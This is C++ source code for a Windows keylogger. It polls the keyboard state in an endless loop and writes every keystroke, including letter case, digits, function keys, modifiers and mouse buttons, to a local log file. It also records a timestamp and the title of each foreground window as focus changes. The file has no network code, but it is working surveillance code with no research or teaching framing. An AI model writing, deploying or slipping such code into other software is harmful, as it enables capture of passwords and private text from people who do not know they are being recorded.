#include <iostream>
#include <io.h>
#include <fcntl.h>
#include <Windows.h>

#include "logger.h"

logger Log(L"test.log",true);

std::wstring s2ws(const std::string& str)
{
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
	std::wstring wstrTo(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
	return wstrTo;
}

bool isListedKey(wchar_t key)
{
	//Function key
	if (key >= VK_F1 && key <= VK_F24)
	{
		Log << L" *F" << std::to_wstring((int)key - VK_F1 + 1) << L"* ";
		return true;
	}
	else if (key >= VK_NUMPAD0 && key <= VK_NUMPAD9)
	{
		Log << std::to_wstring((int)key - VK_NUMPAD0);
		return true;
	}

	switch (key)
	{
	// Arrow Key
	case VK_LEFT:
		Log << L" *Left Arrow Key* ";
		break;
	case VK_RIGHT:
		Log << L" *Right Arrow Key* ";
		break;
	case VK_UP:
		Log << L" *Up Arrow Key* ";
		break;
	case VK_DOWN:
		Log << L" *Down Arrow Key* ";
		break;

	//Function key
	case VK_RETURN:
		Log << L"\n";
		break;
	case VK_SPACE:
		Log << L" ";
		break;
	case VK_END:
		Log << L" *End Key* ";
		break;
	case VK_HOME:
		Log << L" *Home Key* ";
		break;
	case VK_NEXT:
		Log << L" *Page Down Key* ";
		break;
	case VK_PRIOR:
		Log << L" *Page Up Key* ";
		break;
	case VK_DELETE:
		Log << L" *Delete key* ";
		break;
	case VK_NUMLOCK:
		Log << L" *Numlock key* ";
		break;


	case VK_SHIFT:
		Log << L" *Shift* ";
		break;
	case VK_RSHIFT:
		Log << L" *Right Shift* ";
		break;
	case VK_LSHIFT:
		Log << L" *Left Shift* ";
		break;
	case VK_CONTROL:
		Log << L" *Control* ";
		break;
	case VK_RCONTROL:
		Log << L" *Right Control* ";
		break;
	case VK_LCONTROL:
		Log << L" *Left Control* ";
		break;
	case VK_MENU:
		Log << L" *ALT* ";
		break;
	case VK_RMENU:
		Log << L" *Right ALT* ";
		break;
	case VK_LMENU:
		Log << L" *Left ALT* ";
		break;
	case VK_TAB:
		Log << L" *Tabulation* ";
		break;
	case VK_CAPITAL:
		Log << L" *Caps lock* ";
		break;
	case VK_BACK:
		Log << L"\b";
		break;
	
	// Mouse button
	case VK_LBUTTON:
		Log << L" *Left button* ";
		break;
	case VK_RBUTTON:
		Log << L" *Right button* ";
		break;
	case VK_MBUTTON:
		Log << L" *Middle button* ";
		break;
	default:
		return false;
	}
	return true;
}

bool pressed(char key)
{
	return (GetKeyState(key) & 0x8000) ? true : false;
}
bool toggled(char key)
{
	return (GetKeyState(key) & 0x0001) ? true : false;
}

int wmain(int argc, char** argv)
{
	HWND w1, w2;
	w1 = GetForegroundWindow();
	
	char key;

	SYSTEMTIME st;
	GetSystemTime(&st);
	char buffer[255];
	GetWindowText(w1, buffer, 255);
	std::wstring nstr = L"\n\n[ " + std::to_wstring(st.wDay) + L"/" + std::to_wstring(st.wMonth) + L"/" + std::to_wstring(st.wYear) + L" | " + std::to_wstring(st.wHour) + L":" + std::to_wstring(st.wMinute) + L":" + std::to_wstring(st.wSecond) + L" ] -> Window name : \"" + std::wstring(s2ws(std::string(buffer))) + L"\"\n\n";
	Log << nstr;

	while (true)
	{
		Sleep(10);
		for (key = 8; key < 255; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				w2 = GetForegroundWindow();
				if (w2 != w1)
				{
					w1 = w2;
					SYSTEMTIME st;
					GetSystemTime(&st);
					char buffer[255];
					GetWindowText(w1, buffer, 255);
					std::wstring nstr = L"\n\n[ " + std::to_wstring(st.wDay) + L"/" + std::to_wstring(st.wMonth) + L"/" + std::to_wstring(st.wYear) + L" | " + std::to_wstring(st.wHour) + L":" + std::to_wstring(st.wMinute) + L":" + std::to_wstring(st.wSecond) + L" ] -> Window name : \"" + std::wstring(s2ws(std::string(buffer))) + L"\"\n\n";
					Log << nstr;
				}
				if (!isListedKey(key))
				{	
					if (key >= 'A' && key <= 'Z')
					{
						if ( (pressed(VK_SHIFT) && !toggled(VK_CAPITAL)) || (!pressed(VK_SHIFT) && toggled(VK_CAPITAL)) )
						{
							Log << (wchar_t)(key - 'A' + L'A');
						}
						else
						{
							Log << (wchar_t)(key - 'A' + L'a');
						}
					}
					else if (key >= '0' && key <= '9')
					{
						Log << (wchar_t)(key - '0' + L'0');
					}
				}
			}
		}




	}

	return 0;
}
